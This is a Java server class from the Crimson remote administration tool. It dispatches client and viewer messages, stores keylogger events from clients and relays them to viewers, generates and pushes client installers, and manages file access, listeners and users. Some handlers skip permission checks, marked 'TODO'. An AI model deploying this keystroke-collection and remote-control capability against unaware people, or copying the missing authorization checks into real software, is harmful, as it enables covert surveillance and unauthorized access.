/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.server.net;

import java.util.Date;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.google.protobuf.ByteString;
import com.subterranean_security.crimson.core.attribute.keys.AKeySimple;
import com.subterranean_security.crimson.core.misc.AuthenticationGroup;
import com.subterranean_security.crimson.core.net.BasicExecutor;
import com.subterranean_security.crimson.core.net.Connector.ConnectionState;
import com.subterranean_security.crimson.core.net.stream.StreamStore;
import com.subterranean_security.crimson.core.net.stream.subscriber.SubscriberSlave;
import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
import com.subterranean_security.crimson.core.proto.ClientAuth.RS_CreateAuthMethod;
import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
import com.subterranean_security.crimson.core.proto.ClientAuth.RS_RemoveAuthMethod;
import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
import com.subterranean_security.crimson.core.proto.Delta.EV_ServerProfileDelta;
import com.subterranean_security.crimson.core.proto.Delta.EV_ViewerProfileDelta;
import com.subterranean_security.crimson.core.proto.Generator.GenReport;
import com.subterranean_security.crimson.core.proto.Generator.RS_Generate;
import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
import com.subterranean_security.crimson.core.proto.Keylogger.RS_KeyUpdate;
import com.subterranean_security.crimson.core.proto.Log.LogFile;
import com.subterranean_security.crimson.core.proto.Log.LogType;
import com.subterranean_security.crimson.core.proto.Log.RS_Logs;
import com.subterranean_security.crimson.core.proto.MSG.Message;
import com.subterranean_security.crimson.core.proto.Misc.Outcome;
import com.subterranean_security.crimson.core.proto.State.RS_ChangeServerState;
import com.subterranean_security.crimson.core.proto.Stream.EV_EndpointClosed;
import com.subterranean_security.crimson.core.proto.Stream.Param;
import com.subterranean_security.crimson.core.proto.Users.RQ_AddUser;
import com.subterranean_security.crimson.core.proto.Users.RS_AddUser;
import com.subterranean_security.crimson.core.proto.Users.RS_EditUser;
import com.subterranean_security.crimson.core.store.ConnectionStore;
import com.subterranean_security.crimson.core.util.CryptoUtil;
import com.subterranean_security.crimson.core.util.ProtoUtil;
import com.subterranean_security.crimson.sc.Logsystem;
import com.subterranean_security.crimson.server.Generator;
import com.subterranean_security.crimson.server.net.exe.AuthExe;
import com.subterranean_security.crimson.server.net.exe.CvidExe;
import com.subterranean_security.crimson.server.net.exe.DeltaExe;
import com.subterranean_security.crimson.server.net.exe.FileManagerExe;
import com.subterranean_security.crimson.server.net.exe.LoginExe;
import com.subterranean_security.crimson.server.net.exe.NetworkExe;
import com.subterranean_security.crimson.server.net.stream.SInfoSlave;
import com.subterranean_security.crimson.server.store.AuthStore;
import com.subterranean_security.crimson.server.store.ListenerStore;
import com.subterranean_security.crimson.server.store.ProfileStore;
import com.subterranean_security.crimson.server.store.ServerDatabaseStore;
import com.subterranean_security.crimson.sv.net.Listener;
import com.subterranean_security.crimson.sv.permissions.Perm;
import com.subterranean_security.crimson.sv.permissions.ViewerPermissions;
import com.subterranean_security.crimson.sv.profile.ClientProfile;
import com.subterranean_security.crimson.sv.profile.ViewerProfile;
import com.subterranean_security.crimson.universal.Universal;

import io.netty.util.ReferenceCountUtil;

public class ServerExecutor extends BasicExecutor {
	private static final Logger log = LoggerFactory.getLogger(ServerExecutor.class);

	public ServerExecutor() {
		super();

		dispatchThread = new Thread(new Runnable() {
			public void run() {
				while (!Thread.interrupted()) {
					Message m;
					try {
						m = connector.msgQueue.take();
					} catch (InterruptedException e) {
						return;
					}
					pool.submit(() -> {
						if (Universal.debugNetwork) {
							log.debug("Received: {}", m.toString());
						}
						if (m.hasRid() && m.getRid() != 0) {
							// route
							try {
								ConnectionStore.get(m.getRid()).write(m);
							} catch (NullPointerException e) {
								log.debug("Could not forward message to CVID: {}", m.getRid());
								connector.write(Message.newBuilder()
										.setEvEndpointClosed(EV_EndpointClosed.newBuilder().setCVID(m.getRid()))
										.build());
							}
						} else if (m.hasEvProfileDelta()) {
							DeltaExe.ev_profileDelta(connector, m.getEvProfileDelta());
						} else if (m.hasEvKevent()) {
							ev_kevent(m);
						} else if (m.hasRqLogin()) {
							LoginExe.rq_login(connector, m);
						} else if (m.hasRqGenerate()) {
							rq_generate(m);
						} else if (m.hasRqGroupChallenge()) {
							rq_group_challenge(m);
						} else if (m.hasMiAuthRequest()) {
							AuthExe.mi_auth_request(connector, m);
						} else if (m.hasMiChallengeResult()) {
							AuthExe.mi_challenge_result(connector, m);
						} else if (m.hasRqFileListing()) {
							FileManagerExe.rq_file_listing(connector, m);
						} else if (m.hasRsFileListing()) {
							FileManagerExe.rs_file_listing(connector, m);
						} else if (m.hasRqAdvancedFileInfo()) {
							FileManagerExe.rq_advanced_file_info(connector, m);
						} else if (m.hasMiStreamStart()) {
							mi_stream_start(m);
						} else if (m.hasMiStreamStop()) {
							mi_stream_stop(m);
						} else if (m.hasRqAddListener()) {
							rq_add_listener(m);
						} else if (m.hasRqRemoveListener()) {
							rq_remove_listener(m);
						} else if (m.hasRqAddUser()) {
							rq_add_user(m);
						} else if (m.hasRqEditUser()) {
							rq_edit_user(m);
						} else if (m.hasRqChangeServerState()) {
							rq_change_server_state(m);
						} else if (m.hasRqChangeClientState()) {
							rq_change_client_state(m);
						} else if (m.hasRqFileHandle()) {
							FileManagerExe.rq_file_handle(connector, m);
						} else if (m.hasRsFileHandle()) {
							FileManagerExe.rs_file_handle(connector, m);
						} else if (m.hasRqDelete()) {
							FileManagerExe.rq_delete(connector, m);
						} else if (m.hasRqKeyUpdate()) {
							rq_key_update(m);
						} else if (m.hasMiTriggerProfileDelta()) {
							DeltaExe.mi_trigger_profile_delta(connector, m);
						} else if (m.hasRqCreateAuthMethod()) {
							rq_create_auth_method(m);
						} else if (m.hasRqRemoveAuthMethod()) {
							rq_remove_auth_method(m);
						} else if (m.hasRqLogs()) {
							rq_logs(m);
						} else if (m.hasRqCvid()) {
							CvidExe.rq_cvid(connector, m);
						} else if (m.hasRqDirectConnection()) {
							NetworkExe.rq_direct_connection(connector, m);
						} else {
							connector.addNewResponse(m);
						}

						ReferenceCountUtil.release(m);
					});
				}
			}
		});

	}

	private void ev_kevent(Message m) {
		try {
			ProfileStore.getClient(connector.getCvid()).getKeylog().addEvent(m.getEvKevent());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private void mi_stream_start(Message m) {

		Param p = m.getMiStreamStart().getParam();
		if (p.hasInfoParam()) {
			StreamStore.addStream(new SInfoSlave(p));
		}
		if (p.hasSubscriberParam()) {
			StreamStore.addStream(new SubscriberSlave(p));
		}

	}

	private void mi_stream_stop(Message m) {
		StreamStore.removeStreamBySID(m.getMiStreamStop().getStreamID());
	}

	private void rq_key_update(Message m) {
		RQ_KeyUpdate rq = m.getRqKeyUpdate();
		Date target = new Date(rq.getStartDate());

		// check permissions
		if (!ProfileStore.getViewer(connector.getCvid()).getPermissions().getFlag(rq.getCid(),
				Perm.client.keylogger.read_logs)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
			return;
		}

		ClientProfile cp = ProfileStore.getClient(rq.getCid());
		if (cp != null) {
			for (EV_KEvent k : cp.getKeylog().getEventsAfter(target)) {
				connector.write(Message.newBuilder().setSid(rq.getCid()).setEvKevent(k).build());
			}
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(true)).build());
		} else {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsKeyUpdate(RS_KeyUpdate.newBuilder().setResult(false)).build());
		}

	}

	private void rq_group_challenge(Message m) {
		if (connector.getState() != ConnectionState.AUTH_STAGE2) {
			return;
		}
		RQ_GroupChallenge rq = m.getRqGroupChallenge();
		AuthenticationGroup group = AuthStore.getGroup(rq.getGroupName());

		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder()
				.setResult(CryptoUtil.signGroupChallenge(rq.getMagic(), group.getPrivateKey())).build();
		connector.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
		try {
			Thread.sleep(100);
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

	private void rq_generate(Message m) {

		// check permissions
		if (!ProfileStore.getViewer(connector.getCvid()).getPermissions().getFlag(Perm.server.generator.generate)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsGenerate(RS_Generate.newBuilder()
							.setReport(GenReport.newBuilder().setResult(false).setComment("Insufficient permissions")))
					.build());
			return;
		}

		byte[] res = null;
		Generator g = new Generator();
		try {
			if (m.getRqGenerate().hasSendToCid()) {
				g.generate(m.getRqGenerate().getInternalConfig(), m.getRqGenerate().getSendToCid());
			} else {
				g.generate(m.getRqGenerate().getInternalConfig());
			}

			res = g.getResult();

			RS_Generate.Builder rs = RS_Generate.newBuilder().setInstaller(ByteString.copyFrom(res))
					.setReport(g.getReport());

			if (m.getRqGenerate().hasSendToCid()) {
				ConnectionStore.get(m.getRqGenerate().getSendToCid())
						.write(Message.newBuilder().setRsGenerate(rs).build());
				connector.write(Message.newBuilder().setId(m.getId())
						.setRsGenerate(RS_Generate.newBuilder().setReport(g.getReport())).build());
			} else {
				connector.write(Message.newBuilder().setId(m.getId()).setRsGenerate(rs).build());
			}
		} catch (Exception e) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsGenerate(RS_Generate.newBuilder().setReport(g.getReport())).build());
		}

	}

	private void rq_add_listener(Message m) {
		// check permissions
		if (!ProfileStore.getViewer(connector.getCvid()).getPermissions()
				.getFlag(Perm.server.network.create_listener)) {
			connector.write(Message.newBuilder().setId(m.getId())
					.setRsOutcome(Outcome.newBuilder().setResult(false).setComment("Insufficient permissions"))
					.build());
			return;
		}

		connector.write(
				Message.newBuilder().setId(m.getId()).setRsOutcome(Outcome.newBuilder().setResult(true)).build());
		ListenerStore.listeners.add(new Listener(m.getRqAddListener().getConfig()));
		Message update = Message.newBuilder().setEvServerProfileDelta(
				EV_ServerProfileDelta.newBuilder().addListener(m.getRqAddListener().getConfig())).build();
		ServerConnectionStore.sendToAll(Universal.Instance.VIEWER, update);

	}

	private void rq_remove_listener(Message m) {

	}

	private void rq_add_user(Message m) {
		// TODO check permissions
		connector.write(
				Message.newBuilder().setId(m.getId()).setRsAddUser(RS_AddUser.newBuilder().setResult(true)).build());

		ServerDatabaseStore.getDatabase().addLocalUser(m.getRqAddUser().getUser(), m.getRqAddUser().getPassword(),
				new ViewerPermissions(m.getRqAddUser().getPermissionsList()));

		Message update = Message.newBuilder()
				.setEvViewerProfileDelta(EV_ViewerProfileDelta.newBuilder()
						.addAllViewerPermissions(m.getRqAddUser().getPermissionsList())
						.setPd(EV_ProfileDelta.newBuilder()
								.addGroup(ProtoUtil.getNewGeneralGroup()
										.putAttribute(AKeySimple.VIEWER_USER.getFullID(), m.getRqAddUser().getUser()))))
				.build();
		ServerConnectionStore.sendToAll(Universal.Instance.VIEWER, update);

	}

	private void rq_edit_user(Message m) {
		// TODO check permissions
		connector.write(
				Message.newBuilder().setId(m.getId()).setRsEditUser(RS_EditUser.newBuilder().setResult(true)).build());

		RQ_AddUser rqad = m.getRqEditUser().getUser();

		ViewerProfile vp = null;

		try {
			vp = ProfileStore.getViewer(rqad.getUser());
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		EV_ViewerProfileDelta.Builder b = EV_ViewerProfileDelta.newBuilder()
				.setPd(EV_ProfileDelta.newBuilder().addGroup(ProtoUtil.getNewGeneralGroup()
						.putAttribute(AKeySimple.VIEWER_USER.getFullID(), rqad.getUser())))
				.addAllViewerPermissions(m.getRqAddUser().getPermissionsList());

		if (rqad.getPermissionsCount() != 0) {
			vp.getPermissions().load(rqad.getPermissionsList());
			b.addAllViewerPermissions(rqad.getPermissionsList());
		}

		if (rqad.hasPassword() && ServerDatabaseStore.getDatabase().validLogin(rqad.getUser(),
				CryptoUtil.hashCrimsonPassword(m.getRqEditUser().getOldPassword(),
						ServerDatabaseStore.getDatabase().getSalt(rqad.getUser())))) {
			ServerDatabaseStore.getDatabase().changePassword(rqad.getUser(), rqad.getPassword());

		}

		Message update = Message.newBuilder().setEvViewerProfileDelta(b).build();

		ServerConnectionStore.sendToAll(Universal.Instance.VIEWER, update);

	}

	private void rq_change_server_state(Message m) {
		// TODO check permissions
		String comment = "";
		boolean result = true;

		switch (m.getRqChangeServerState().getNewState()) {
		case FUNCTIONING_OFF:
			ListenerStore.stop();
			break;
		case FUNCTIONING_ON:
			ListenerStore.start();
			break;
		case RESTART:
			break;
		case SHUTDOWN:
			break;
		case UNINSTALL:
			break;
		default:
			break;
		}

		connector.write(Message.newBuilder().setId(m.getId()).setRsChangeServerState(RS_ChangeServerState.newBuilder()
				.setOutcome(Outcome.newBuilder().setResult(result).setComment(comment))).build());

		// notify viewers
		ServerConnectionStore.sendToAll(Universal.Instance.VIEWER,
				Message.newBuilder()
						.setEvServerProfileDelta(EV_ServerProfileDelta.newBuilder().setPd(EV_ProfileDelta.newBuilder()
								.addGroup(ProtoUtil.getNewGeneralGroup().putAttribute(
										AKeySimple.SERVER_STATUS.getFullID(), ListenerStore.isRunning() ? "1" : "0"))))
						.build());
	}

	private void rq_change_client_state(Message m) {

	}

	private void rq_create_auth_method(Message m) {
		Outcome outcome = AuthStore.create(m.getRqCreateAuthMethod().getAuthMethod());

		connector.write(Message.newBuilder().setId(m.getId())
				.setRsCreateAuthMethod(RS_CreateAuthMethod.newBuilder().setOutcome(outcome)).build());

	}

	private void rq_remove_auth_method(Message m) {
		AuthStore.remove(m.getRqRemoveAuthMethod().getId());
		// TODO check if removed
		connector.write(
				Message.newBuilder().setRsRemoveAuthMethod(RS_RemoveAuthMethod.newBuilder().setResult(true)).build());
	}

	private void rq_logs(Message m) {
		RS_Logs.Builder rs = RS_Logs.newBuilder();
		if (m.getRqLogs().hasLog()) {
			rs.addLog(LogFile.newBuilder().setName(m.getRqLogs().getLog())
					.setLog(Logsystem.getLog(m.getRqLogs().getLog())));
		} else {
			for (LogType lt : Logsystem.getApplicableLogs()) {
				rs.addLog(LogFile.newBuilder().setName(lt).setLog(Logsystem.getLog(lt)));
			}
		}
		connector.write(Message.newBuilder().setRsLogs(rs).build());
	}

}
